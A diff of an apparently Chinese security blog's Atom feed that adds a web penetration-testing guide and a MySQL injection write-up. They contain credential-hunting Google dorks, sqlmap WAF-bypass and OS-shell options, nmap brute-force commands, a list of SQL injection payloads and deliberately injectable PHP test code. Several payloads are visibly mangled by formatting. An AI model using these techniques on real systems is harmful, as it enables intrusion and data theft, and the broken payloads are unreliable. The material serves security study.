@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Jrand-github.github.io</id>
     <title>F1n_blog</title>
-    <updated>2021-07-12T14:24:23.898Z</updated>
+    <updated>2021-07-15T03:07:11.415Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Jrand-github.github.io"/>
     <link rel="self" href="https://Jrand-github.github.io/atom.xml"/>
@@ -11,7 +11,1639 @@
     <icon>https://Jrand-github.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, F1n_blog</rights>
     <entry>
-        <title type="html"><![CDATA[域渗透（不定时更新）]]></title>
+        <title type="html"><![CDATA[WEB渗透测试指南]]></title>
+        <id>https://Jrand-github.github.io/post/web-shen-tou-ce-shi-zhi-nan/</id>
+        <link href="https://Jrand-github.github.io/post/web-shen-tou-ce-shi-zhi-nan/">
+        </link>
+        <updated>2021-07-15T03:06:52.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="web安全攻防渗透测试实战指南">WEB安全攻防渗透测试实战指南</h1>
+<h2 id="被动信息收集">被动信息收集</h2>
+<h3 id="域名信息收集">域名信息收集</h3>
+<h4 id="whois查询">Whois查询</h4>
+<p>https://whois.aizhan.com/</p>
+<p>https://www.virustotal.com/</p>
+<h4 id="根域名收集备案">根域名收集（备案）</h4>
+<p>ICP备案查询：http://www.beianbeian.com</p>
+<p>天眼查：http://www.tianyancha.com</p>
+<h4 id="子域名收集">子域名收集</h4>
+<p>OneForAll https://github.com/shmilylty/OneForAll</p>
+<p>ksubdomain：https://github.com/knownsec/ksubdomain</p>
+<p>子域名查询 https://phpinfo.me/domain/</p>
+<p>第三方聚合应用枚举 https://dnsdumpster.com/</p>
+<p>证书透明度公开日志枚举 http://crt.sh</p>
+<p>子域名爆破：<br>
+sublist3r、subdomainsBurte、DiscoverSubdomain、layer子域名挖掘机。</p>
+<p>OneForAll:https://e.coding.net/randhome/ctf/CTFTOOLS-OneForAll.git</p>
+<h4 id="dns">DNS</h4>
+<p>https://viewdns.info/</p>
+<h4 id="查找真实ip">查找真实IP</h4>
+<ul>
+<li>
+<p>目标服务器存在CDN</p>
+<ul>
+<li>内部邮件源</li>
+<li>扫描网站测试文件</li>
+<li>分站域名</li>
+<li>国外访问https://asm.ca.com/en.ping.php</li>
+<li>全球pinghttp://ping.chinaz.com/m.pahx.com</li>
+<li>查询域名的解析记录https://www.netcraft.com</li>
+<li>APP抓包</li>
+<li>绕过CloudFlare CDN查找真实IPhttp://www.crimeflare.us/cfs.html#box</li>
+<li>https://www.cnblogs.com/qiudabai/p/9763739.html</li>
+</ul>
+</li>
+<li>
+<p>目标服务器不存在CDNhttp://www.ip138.com</p>
+<p>可用来找真实ip</p>
+<ul>
+<li>
+<p>http://www.siteinfotool.com/</p>
+</li>
+<li>
+<p>http://toolbar.netcraft.com/site_report</p>
+</li>
+<li>
+<p>https://dnsdumpster.com/</p>
+</li>
+<li>
+<p>https://viewdns.info/iphistory/</p>
+</li>
+<li>
+<p>https://asm.ca.com/</p>
+<p>fofa搜索http shodan规则</p>
+</li>
+<li>
+<p>fofa：https://search.sxisa.com/favicon.ico</p>
+<p>shodan = http.favicon.hash:-935203314</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="同ip网站查询">同IP网站查询</h4>
+<p>http://www.ip-address.org/reverse-lookup/reverse-ip.php<br>
+http://www.yougetsignal.com/tools/web-sites-on-web-server/</p>
+<p>旁站/C段查询</p>
+<p>https://phpinfo.me/bing.php</p>
+<p>https://chapangzhan.com</p>
+<p>http://www.webscan.cc</p>
+<p>http://www.5kik.com</p>
+<p>http://phpinfo.me</p>
+<h3 id="指纹识别">指纹识别</h3>
+<p>BugScaner：http://whatweb.bugscaner.com/look/</p>
+<p>云悉指纹：https://www.yunsee.cn/</p>
+<p>WhatWeb：https://whatweb.net/</p>
+<p>潮汐安全团队http://finger.tidesec.net/</p>
+<h3 id="威胁情报分析">威胁情报分析</h3>
+<h4 id="联网设备查询">联网设备查询</h4>
+<ul>
+<li>
+<p>通过对全网扫描</p>
+<p>360QuaKe<strong>https://quake.360.cn/quake/welcome</strong></p>
+<p>fofa https://fofa.so/</p>
+<p>shodan https://www.shodan.io/</p>
+<p>钟馗之眼<strong>https://www.zoomeye.org/</strong></p>
+</li>
+</ul>
+<h4 id="公众号小程序情报">公众号小程序情报</h4>
+<p>http://www.gsdata.cn</p>
+<p>https://newrank.cn/</p>
+<h4 id="敏感目录文件收集">敏感目录文件收集</h4>
+<ul>
+<li>nikto</li>
+<li>dirsearch</li>
+<li>备份文件-test404</li>
+<li>猪猪侠weakfilescan、cansina、sensitivefilescan、FileSensor</li>
+</ul>
+<h4 id="谷歌高级搜索">谷歌高级搜索</h4>
+<p>谷歌黑客</p>
+<p>https://pentest-tools.com/information-gathering/google-hacking#</p>
+<p>https://scan.top15.cn/web/</p>
+<p>https://www.exploit-db.com/google-hacking-database</p>
+<p>google hacking</p>
+<ul>
+<li>指定域名：<br>
+site:xxx.com</li>
+<li>URL中存在关键字的网页：<br>
+inurl:admin</li>
+<li>网页正文中的关键字：<br>
+intext:admin</li>
+<li>指定文件类型：<br>
+Filetype:PDF</li>
+<li>网页标题中的关键字：<br>
+intitle:管理员</li>
+<li>返回所有与xxx.com做了链接的URL：link</li>
+<li>查找指定站点的一些基本信息：Info</li>
+<li>搜索Google里关于某些内容的缓存：cache</li>
+</ul>
+<p>https://www.exploit-db.com/google-hacking-database</p>
+<pre><code>site:*.example.org ext:php | ext:txt | ext:log
+</code></pre>
+<pre><code>site:*.example.org ext:pdf | ext:doc| ext:docx | ext:ppt | ext:pptx | ext:xls | ext:xlsx | ext:csv
+</code></pre>
+<pre><code>site:edu.cn ext:doc title:身份证
+</code></pre>
+<p>通过Github获取数据库泄露信息。</p>
+<pre><code>site:Github.com sa password
+
+site:Github.com root password
+
+site:Github.com User ID='sa'
+</code></pre>
+<p>使用Github获取邮件配置信息泄露的信息</p>
+<pre><code>site:Github.com smtp @qq.com
+site:Github.com smtp
+</code></pre>
+<h4 id="js拓展信息面">JS拓展信息面</h4>
+<p>js爬取域名，url链接</p>
+<p>https://github.com/Threezh1/JSFinder</p>
+<h2 id="主动信息收集">主动信息收集</h2>
+<h3 id="常用端口信息收集">常用端口信息收集</h3>
+<ul>
+<li>Nmap</li>
+<li>无状态端口扫描工具Masscan</li>
+<li>ZMap</li>
+<li>御剑高速TCP端口扫描工具</li>
+</ul>
+<h2 id="漏洞环境搭建">漏洞环境搭建</h2>
+<h3 id="linux安装lanmp">Linux安装LANMP</h3>
+<ul>
+<li>wget  http://dl.wdlinux.cn/files/lanmp_v3.tar.gz</li>
+</ul>
+<h3 id="windows安装wamp">Windows安装WAMP</h3>
+<ul>
+<li>
+<p>下载链接：<br>
+https://sourceforge.net/projects/wampserver/</p>
+</li>
+<li>
+<p>安装报错</p>
+<p>找不到MSVCR110.dll</p>
+<p>https://www.zhaodll.com/dll/softdown.asp?softid=41552&amp;iz2=2a9db44a3a7e2d7f65f2c100b6662097</p>
+</li>
+</ul>
+<h2 id="常用渗透测试工具">常用渗透测试工具</h2>
+<h3 id="sqlmap">SQLMap</h3>
+<ul>
+<li>
+<p>五种漏洞检测技术</p>
+<ul>
+<li>
+<p>基于布尔类型的盲注</p>
+<ul>
+<li>可以根据返回页面判断条件真假</li>
+</ul>
+</li>
+<li>
+<p>基于时间的盲注</p>
+<ul>
+<li>不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li>
+</ul>
+</li>
+<li>
+<p>基于报错的注入</p>
+<ul>
+<li>页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li>
+</ul>
+</li>
+<li>
+<p>联合查询注入</p>
+<ul>
+<li>在可以使用Union的情况下注入</li>
+</ul>
+</li>
+<li>
+<p>堆查询注入</p>
+<ul>
+<li>可以同时执行多条语句时的注入</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>常用选项</p>
+<ul>
+<li>-u            指定URL<br>
+-r            从文本中获取HTTP请求<br>
+--dbs    查询当前用户下的所有数据库<br>
+--tables  获取数据库的表名<br>
+--columns  获取表中的字段名<br>
+--dump       获取字段内容<br>
+--users         获取数据库的所有用户<br>
+--passwords   获取数据库用户的密码<br>
+--current-db    获取当前数据库的名称<br>
+--current-user   获取当前网站数据库的用户名称<br>
+--level                   探测等级<br>
+--is-dba                当前用户是否为管理员权限<br>
+--relos                   列出数据库管理员角色<br>
+--referer               指定请求的Referer头<br>
+--sql-shell            运行自定义SQL语句<br>
+--os-cmd  --os-shell        运行任意操作系统命令<br>
+--file-read            从数据库服务器中读取文件<br>
+--file-write   --file-dest   上传文件到数据库服务器中</li>
+</ul>
+</li>
+<li>
+<p>使用方法</p>
+<ul>
+<li>sqlmap.py   -u   &quot;http://xxx.com/1.php?id=1&quot;           检测注入点<br>
+sqlmap .py  -u    &quot;http://xxx.com/1.php?id=1&quot;    --dbs   查询当前用户下的所有数据库<br>
+sqlmap.py   -u    &quot;http://xxx.com/1.php?id=1&quot;   --D  xxx --tables   获取xxx数据库中的表名<br>
+sqlmap.py  -u  &quot;http://xxx.com/1.php?id=1 &quot;    -D   XXX   -T   xxxx     获取xxxx表中的字段名<br>
+sqlmap.py  -u  &quot;http://xxx.com/1.php?id-1&quot;     -D    XXX   -T   xxx   -C xxx  --dump   获取字段内容</li>
+</ul>
+</li>
+<li>
+<p>tamper脚本</p>
+<ul>
+<li>
+<p>apostrophemask.py</p>
+<ul>
+<li>作用:将引号替换为UTF-8,用于过滤单引号</li>
+</ul>
+</li>
+<li>
+<p>base64encode.py</p>
+<ul>
+<li>作用：替换成base64编码</li>
+</ul>
+</li>
+<li>
+<p>multiplespaces.py</p>
+<ul>
+<li>作用：围绕SQL关键字添加多个空格</li>
+</ul>
+</li>
+<li>
+<p>space2plus.py</p>
+<ul>
+<li>作用：用+号替换空格</li>
+</ul>
+</li>
+<li>
+<p>nonrecursivereplacement.py</p>
+<ul>
+<li>作用：将空格替换为其他有效字符</li>
+</ul>
+</li>
+<li>
+<p>unionalltounion.py</p>
+<ul>
+<li>作用：将UNION ALL SELECT替换为UNION  SELECT</li>
+</ul>
+</li>
+<li>
+<p>securesphere.py</p>
+<ul>
+<li>作用：追加特制的字符串</li>
+</ul>
+</li>
+<li>
+<p>space2mssqlblank.py（mssql)</p>
+<ul>
+<li>作用：将空格替换为其他空字符</li>
+</ul>
+</li>
+<li>
+<p>space2mssqlhash.py</p>
+<ul>
+<li>作用：将空格替换为#号，并添加一个换行符</li>
+</ul>
+</li>
+<li>
+<p>between.py</p>
+<ul>
+<li>作用：用NOT BETWEEN 0 AND替换大于号（&gt;),用BETWEEN AND 替换等号(=)</li>
+</ul>
+</li>
+<li>
+<p>percentage.py</p>
+<ul>
+<li>作用：ASP允许在每个字符前面添加一个%符号</li>
+</ul>
+</li>
+<li>
+<p>sp_password.py</p>
+<ul>
+<li>作用：从DBMS日志的自动模糊处理的有效载荷中追加sp_password</li>
+</ul>
+</li>
+<li>
+<p>charencode.py</p>
+<ul>
+<li>作用：对给定的Payload全部字符使用URL编码（不处理已经编码的字符）</li>
+</ul>
+</li>
+<li>
+<p>randomcase.py</p>
+<ul>
+<li>作用：随机大小写</li>
+</ul>
+</li>
+<li>
+<p>charunicodeencode.py</p>
+<ul>
+<li>作用：字符串unicode编码</li>
+</ul>
+</li>
+<li>
+<p>space2comment.py</p>
+<ul>
+<li>作用：将空格替换为/**/</li>
+</ul>
+</li>
+<li>
+<p>equaltolike.py</p>
+<ul>
+<li>作用：将等号替换为like</li>
+</ul>
+</li>
+<li>
+<p>greatest.py</p>
+<ul>
+<li>作用：绕过对&quot;&gt;&quot;的过滤，用于GREATEST替换大于号</li>
+</ul>
+</li>
+<li>
+<p>ifnull2ilsnull.py</p>
+<ul>
+<li>作用：绕过对IFNULL的过滤，替换类似IFNULL（A，B）为IF（ISNULL（A），B，A）。</li>
+</ul>
+</li>
+<li>
+<p>modsecurityversioned.py</p>
+<ul>
+<li>作用：过滤空格，使用MYSQL内联注释的方式进行注入</li>
+</ul>
+</li>
+<li>
+<p>space2mysqlblank.py</p>
+<ul>
+<li>作用：将空格替换为其他空白字符（使用于MYSQL）</li>
+</ul>
+</li>
+<li>
+<p>modsecurityzeroversioned.py</p>
+<ul>
+<li>作用：使用Mysql内联注释的方式（/<em>!00000</em>/）进行注入</li>
+</ul>
+</li>
+<li>
+<p>space2mysqldash.py</p>
+<ul>
+<li>作用：将空格替换为——，并添加一个换行符</li>
+</ul>
+</li>
+<li>
+<p>bluecoat.py</p>
+<ul>
+<li>作用：在SQL语句之后用有效的随机空白字符替换空格符，随后用LIKE替换等于号</li>
+</ul>
+</li>
+<li>
+<p>versionedkeywords.py</p>
+<ul>
+<li>作用：注释绕过</li>
+</ul>
+</li>
+<li>
+<p>space2morehash.py</p>
+<ul>
+<li>作用：将空格替换为#号，并添加一个随机字符串和换行符</li>
+</ul>
+</li>
+<li>
+<p>apostrophenullendoce.py</p>
+<ul>
+<li>作用：用非法双字节unicode字符替换单引号</li>
+</ul>
+</li>
+<li>
+<p>appendnullbyte.py</p>
+<ul>
+<li>作用：在有效负荷的结束位置加载零字节字符编号</li>
+</ul>
+</li>
+<li>
+<p>chardoubleencode.py</p>
+<ul>
+<li>作用：对给定的Payload全部字符使用双重URL编码（不处理已经编码的字符)</li>
+</ul>
+</li>
+<li>
+<p>unmagicquotes.py</p>
+<ul>
+<li>作用：用一个多字节组合(%bf%27)和末尾通用注释一起替换空格</li>
+</ul>
+</li>
+<li>
+<p>randomcomments.py</p>
+<ul>
+<li>作用：用/**/分割SQL关键字</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="burpsuite">Burpsuite</h3>
+<ul>
+<li>
+<p>Proxy</p>
+<ul>
+<li>Forward表示将拦截的数据包发送至数据库</li>
+<li>Drop表示丢弃当前拦截的数据包</li>
+<li>Interception  is  on表示开启拦截功能,单击后变为interception  is  off，表示关闭拦截功能</li>
+<li>action按钮，可以将数据包进一步发送到Spider、Scanner、Repeater、Intruder等功能组件</li>
+</ul>
+</li>
+<li>
+<p>Spider</p>
+</li>
+<li>
+<p>Decoder</p>
+<ul>
+<li>
+<p>编码解码</p>
+<ul>
+<li>URL</li>
+<li>HTML</li>
+<li>Base64</li>
+<li>ASCII</li>
+<li>十六进制</li>
+<li>八进制</li>
+<li>二进制</li>
+<li>GZIP</li>
+</ul>
+</li>
+<li>
+<p>Hash散列</p>
+<ul>
+<li>SHA</li>
+<li>SHA-224</li>
+<li>SHA-256</li>
+<li>SHA-384</li>
+<li>SHA-512</li>
+<li>MD2</li>
+<li>MD5</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Scanner</p>
+<ul>
+<li>
+<p>主动扫描</p>
+<ul>
+<li>客户端漏洞，如XSS、HTTP头注入、操作重定向</li>
+<li>服务端漏洞，如SQL注入、命令行注入、文件遍历</li>
+</ul>
+</li>
+<li>
+<p>被动扫描</p>
+<ul>
+<li>提交的密码为为加密的明文</li>
+<li>不安全的cookie的属性，例如缺少httpOnly和安全标志</li>
+<li>Cookie的范围缺失</li>
+<li>跨域脚本包含和站点引用泄漏</li>
+<li>表单值自动填充，尤其是密码</li>
+<li>SSL保护的内容缓存</li>
+<li>目录遍历</li>
+<li>提交密码后应答延迟</li>
+<li>session令牌的不安全传输</li>
+<li>敏感信息泄漏，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄漏</li>
+<li>不安全的ViewState的配置</li>
+<li>错误或不规范的Content-Type</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Intruder</p>
+<ul>
+<li>
+<p>标识符枚举</p>
+<ul>
+<li>WEB应用程序经常使用标识符引用用户、帐号、资产等数据信息。例如，用户名、文件ID和帐号号码</li>
+</ul>
+</li>
+<li>
+<p>提取有用的数据</p>
+<ul>
+<li>在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其他个人空间名字和年龄</li>
+</ul>
+</li>
+<li>
+<p>模糊测试</p>
+<ul>
+<li>很多输入型的漏洞（如SQL注入、跨站点脚本和文件路径遍历）可以通过请求参数提交各种测试字符串,并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload，通过Burpsuite Intruder自动化对WEB应用程序进行模糊测试</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Repeater</p>
+</li>
+<li>
+<p>Comparer</p>
+<ul>
+<li>枚举用户名的过程中，对比分析登录成功和失败时，服务器反馈的结果区别</li>
+<li>使用Intruder进行攻击时，对于不同的服务端相应，可以很快分析出两次响应的区别在哪里。</li>
+<li>进行SQL注入盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系</li>
+</ul>
+</li>
+<li>
+<p>Sequencer</p>
+</li>
+</ul>
+<h3 id="masscan">masscan</h3>
+<h3 id="nmap">Nmap</h3>
+<ul>
+<li>
+<p>特点</p>
+<ul>
+<li>主机探测</li>
+<li>端口扫描</li>
+<li>版本检测</li>
+<li>系统检测</li>
+<li>支持探测脚本的编写</li>
+</ul>
+</li>
+<li>
+<p>常用方法</p>
+<ul>
+<li>
+<p>扫描单个目标地址</p>
+<ul>
+<li>nmap   192.168.0.100</li>
+</ul>
+</li>
+<li>
+<p>扫描多个目标地址</p>
+<ul>
+<li>nmap  192.168.0.100  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>扫描一个范围内的目标地址</p>
+<ul>
+<li>nmap  192.168.0.100-110</li>
+</ul>
+</li>
+<li>
+<p>扫描目标地址所在的某个网段</p>
+<ul>
+<li>nmap  192.168.0.100/24</li>
+</ul>
+</li>
+<li>
+<p>扫描主机列表targets.txt中的所有目标地址</p>
+<ul>
+<li>nmap    -iL   targets.txt</li>
+</ul>
+</li>
+<li>
+<p>扫描除某一个目标地址之外的所有目标地址</p>
+<ul>
+<li>nmap   192.168.0.100/24  -exclude  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>扫描除某一文件中的目标地址之外的目标地址</p>
+<ul>
+<li>nmap  192.168.0.100/24  --exclude  targets.txt</li>
+</ul>
+</li>
+<li>
+<p>扫描某一目标的21、22、23、80端口</p>
+<ul>
+<li>nmap  192.168.0.100  -p  21,22,23,80</li>
+</ul>
+</li>
+<li>
+<p>对目标地址进行路由跟踪</p>
+<ul>
+<li>nmap   --traceroute   192.168.0.110</li>
+</ul>
+</li>
+<li>
+<p>扫描目标地址所在C段的在线状况</p>
+<ul>
+<li>nmap   -sP  192.168.0.100/24</li>
+</ul>
+</li>
+<li>
+<p>目标地址的操作系统指纹识别</p>
+<ul>
+<li>nmap    -O  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>目标地址提供的服务版本探测</p>
+<ul>
+<li>nmap   -sV  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>探测防火墙状态</p>
+<ul>
+<li>nmap  -sF  -T4  192.168.0.105</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>状态识别</p>
+<ul>
+<li>
+<p>open</p>
+<ul>
+<li>开放的，表示应用程序正在监听该端口的连接，外部可以访问</li>
+</ul>
+</li>
+<li>
+<p>filtered</p>
+<ul>
+<li>被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</li>
+</ul>
+</li>
+<li>
+<p>closed</p>
+<ul>
+<li>关闭的，表示目标主机未开启该端口</li>
+</ul>
+</li>
+<li>
+<p>unfiltered</p>
+<ul>
+<li>未被过滤的，表示nmap无法确定端口所处的状态，需进一步探测</li>
+</ul>
+</li>
+<li>
+<p>open/filtered</p>
+<ul>
+<li>开放的或被过滤的，Nmap无法识别</li>
+</ul>
+</li>
+<li>
+<p>closed/filtered</p>
+<ul>
+<li>关闭的或被过滤的，Nmap无法识别</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>脚本类型</p>
+<ul>
+<li>
+<p>Auth</p>
+<ul>
+<li>负责处理鉴权证书（绕过鉴权）的脚本</li>
+</ul>
+</li>
+<li>
+<p>Broadcast</p>
+<ul>
+<li>在局域网中探查更多服务的开启情况，如DHCP/DNS/Sqlserver等</li>
+</ul>
+</li>
+<li>
+<p>Brute</p>
+<ul>
+<li>针对常见的应用提供暴力破解方式，如HTTP/SMTP</li>
+</ul>
+</li>
+<li>
+<p>Default</p>
+<ul>
+<li>使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力</li>
+</ul>
+</li>
+<li>
+<p>Discoverty</p>
+<ul>
+<li>对网络进行更多信息的搜集，如SMB枚举、SNmp查询等。</li>
+</ul>
+</li>
+<li>
+<p>Dos</p>
+<ul>
+<li>用于进行拒绝服务攻击</li>
+</ul>
+</li>
+<li>
+<p>Exploit</p>
+<ul>
+<li>利用已知的漏洞入侵系统</li>
+</ul>
+</li>
+<li>
+<p>External</p>
+<ul>
+<li>利用第三方的数据库或资源。例如，进行Whois解析。</li>
+</ul>
+</li>
+<li>
+<p>Fuzzer</p>
+<ul>
+<li>模糊测试脚本，发送异常的包到目标机，探测出潜在的漏洞</li>
+</ul>
+</li>
+<li>
+<p>Intrusive</p>
+<ul>
+<li>入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li>
+</ul>
+</li>
+<li>
+<p>Malware</p>
+<ul>
+<li>探测目标机是否感染病毒、开启后门等信息</li>
+</ul>
+</li>
+<li>
+<p>Safe</p>
+<ul>
+<li>此类与Intrusive相反，属于安全性脚本</li>
+</ul>
+</li>
+<li>
+<p>Version</p>
+<ul>
+<li>负责增强服务与版本扫描功能的脚本</li>
+</ul>
+</li>
+<li>
+<p>Vuln</p>
+<ul>
+<li>负责检查目标机是否有常见的漏洞，如MS-08-067</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>常用脚本使用方法</p>
+<ul>
+<li>
+<p>鉴权扫描</p>
+<ul>
+<li>nmap   --script=auth  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>暴力破解攻击</p>
+<ul>
+<li>nmap   --script=brute   192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>扫描常见的漏洞</p>
+<ul>
+<li>nmap   -script=vuln  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>应用服务扫描</p>
+<ul>
+<li>nmap   --script=realvnc-auth-bypass  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>探测局域网内更多服务开启的情况</p>
+<ul>
+<li>nmap  -n  -p  445   --script=broadcast  192.168.0.105</li>
+</ul>
+</li>
+<li>
+<p>Whois查询</p>
+<ul>
+<li>nmap   --script=external   xxx.com</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[mysql注入漏洞]]></title>
+        <id>https://Jrand-github.github.io/post/mysql-zhu-ru-lou-dong/</id>
+        <link href="https://Jrand-github.github.io/post/mysql-zhu-ru-lou-dong/">
+        </link>
+        <updated>2021-07-12T16:13:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="mysql注入漏洞总结">mySQL注入漏洞总结</h1>
+<p>https://blog.csdn.net/weixin_32334681/article/details/113301274</p>
+<h2 id="联合查询">联合查询</h2>
+<p>确认注入类型</p>
+<p>数字型：select name,age from admin where id =$id</p>
+<p>字符型：select name,age from admin where id =’$id’</p>
+<p>若是数字</p>
+<p>id =1+1 若返回页面不是id=1的 判断为数字型</p>
+<p>万能方法：</p>
+<p>‘—%20 若正常则为字符型 反之则为数字型</p>
+<p>总结根据多次数据库测试</p>
+<p>select * from admin where id =1 —%20 正常</p>
+<p>select * from admin where id =’1 —%20’ 正常</p>
+<p>猜测语句</p>
+<pre><code>%23 --+ #
+')%23 &quot;)%23 
+</code></pre>
+<h2 id="报错注入">报错注入</h2>
+<p>原理分析<br>
+https://www.cnblogs.com/Triomphe/p/9489639.html</p>
+<p>12种报错注入+万能语句</p>
+<pre><code class="language-sql">1、通过floor报错,注入语句如下:
+and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);
+
+2、通过ExtractValue报错,注入语句如下:
+and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+3、通过UpdateXml报错,注入语句如下:
+and 1=(updatexml(1,concat(0x3a,(select user())),1))
+
+4、通过NAME_CONST报错,注入语句如下:
+and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
+
+5、通过join报错,注入语句如下:
+select * from(select * from mysql.user ajoin mysql.user b)c;
+
+6、通过exp报错,注入语句如下:
+and exp(~(select * from (select user () ) a) );
+
+7、通过GeometryCollection()报错,注入语句如下:
+and GeometryCollection(()select *from(select user () )a)b );
+
+8、通过polygon ()报错,注入语句如下:
+and polygon (()select * from(select user ())a)b );
+
+9、通过multipoint ()报错,注入语句如下:
+and multipoint (()select * from(select user() )a)b );
+
+10、通过multlinestring ()报错,注入语句如下:
+and multlinestring (()select * from(selectuser () )a)b );
+
+11、通过multpolygon ()报错,注入语句如下:
+and multpolygon (()select * from(selectuser () )a)b );
+
+12、通过linestring ()报错,注入语句如下:
+and linestring (()select * from(select user() )a)b );
+</code></pre>
+<h2 id="布尔注入">布尔注入</h2>
+<p>重点：正常情况一个页面，不正常情况另外一种页面而且不回显任何信息</p>
+<p>正常<br>
+select name from admin where id=1 if((select name from admin where id=1 limit 1,1),true,false)</p>
+<p>变形<br>
+select name from admin where id=1 and ord(mid(database(),1,1)&gt;100</p>
+<h2 id="延时注入">延时注入</h2>
+<p>重点：无论正常还是非正常参数都返回一个相同的页面<br>
+基本函数<br>
+延时：sleep（时间）<br>
+判断：if(条件，true，false)<br>
+截取：mid<br>
+控制数量：<br>
+转码：ord</p>
+<pre><code>select name from admin where id=1 if(ord(mid((select name from admin where id=1 limit 1,1),1,1))&gt;97,sleep(5),0)
+</code></pre>
+<h2 id="搜索型注入">搜索型注入</h2>
+<p>搜索型语句：</p>
+<pre><code>select * from admin where name like '%$id%'
+</code></pre>
+<p>查询方法构造</p>
+<p>‘%a’ //以a结尾的数据<br>
+‘a%’ //以a开头的数据<br>
+‘%a%’ //含有a的数据<br>
+‘<em>a</em>‘ //三位且中间字母是a的<br>
+‘<em>a’ //两位且结尾字母是a的‘a</em>‘ //两位且开头字母是a的<br>
+关键：闭合语句使用联合查询</p>
+<p>测试代码</p>
+<pre><code class="language-php">&lt;?php 
+$id = $_GET['id'];
+$localhost = &quot;127.0.0.1&quot;;
+$name=&quot;root&quot;;
+$pass=&quot;root&quot;;
+$dbname=&quot;bc&quot;;
+$conn=mysqli_connect($localhost,$name,$pass,$dbname);
+$sql = &quot;select * from admin where name like '%$id%'&quot;;
+$result=mysqli_query($conn,$sql);
+$text = mysqli_fetch_assoc($result);
+$n=$text['name'];
+$a=$text['age'];
+echo $n;
+echo &quot;&lt;br&gt;&quot;;
+echo $sql;
+ ?&gt;
+</code></pre>
+<h2 id="二次注入">二次注入</h2>
+<pre><code>insert into if_order(out_trade_no,gid,money,rel,benTime,type,number)values(''+data+'',2,10,'245435345345',now(),'qqpay',1)--+
+</code></pre>
+<p>无效语句</p>
+<pre><code>insert into if_order(out_trade_no,gid,money,rel,benTime,type,number)values(eee',2,10,'245435345345',now(),'qqpay',1),((select user()),1,10,'111',now(),'wxpay',1)--+
+</code></pre>
+<p>正确语句</p>
+<p>请后插 无法拼接</p>
+<p>代码系统</p>
+<pre><code class="language-php">&lt;?php 
+$user = $_GET['name'];
+$ed = $_GET['ed'];
+$localhost = &quot;127.0.0.1&quot;;
+$name=&quot;root&quot;;
+$pass=&quot;root&quot;;
+$dbname=&quot;bc&quot;;
+$conn=mysqli_connect($localhost,$name,$pass,$dbname);
+//显示所有的用户信息
+//首先查询有多少条
+$id=1;
+while(1==1){
+$sql = &quot;select * from admin where id=$id&quot;;
+$result = mysqli_query($conn,$sql);
+if($result){
+$num = mysqli_fetch_assoc($result);
+echo $num['name'];
+echo &quot;&lt;br&gt;&quot;;
+$id=$id+1;
+}
+else{
+break;
+}
+}
+$sql1 = &quot;insert into admin(id,name) values ($ed,$user)&quot;;
+$result1 = mysqli_query($conn,$sql1);
+if($result1){
+echo &quot;&lt;script&gt;alert(\&quot;插入成功\&quot;)&lt;/script&gt;&quot;;
+}
+else{
+echo &quot;&lt;script&gt;alert(\&quot;插入失败\&quot;)&lt;/script&gt;&quot;;
+}
+?&gt;
+</code></pre>
+<h2 id="宽字节注入">宽字节注入</h2>
+<p>逃逸单引号</p>
+<pre><code>mysql的数据库默认字符设置为SET NAMES GBK
+</code></pre>
+<p><strong>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</strong></p>
+<p><strong>%df%27===&gt;(addslashes)<mark><mark>&gt;%df%5c%27</mark></mark>&gt;(GBK)====&gt;運’</strong></p>
+<p><strong>用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</strong></p>
+<pre><code>当一个Mysql连接请求从客户端传来的时候，服务器认为它的编码是character_set_client，
+然后会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，
+然后更新到数据库的时候，再转化成字段所对应的编码
+如果使用了set names指令，那么可以修改character_set_connection的值，
+也同时会修改character_set_client和character_set_results的值
+当从数据库查询数据返回结果的时候，将字段从默认的编码转成character_set_results
+</code></pre>
+<p>修复：</p>
+<p>（1）使用mysql_set_charset(GBK)指定字符集</p>
+<p>（2）使用mysql_real_escape_string进行转义</p>
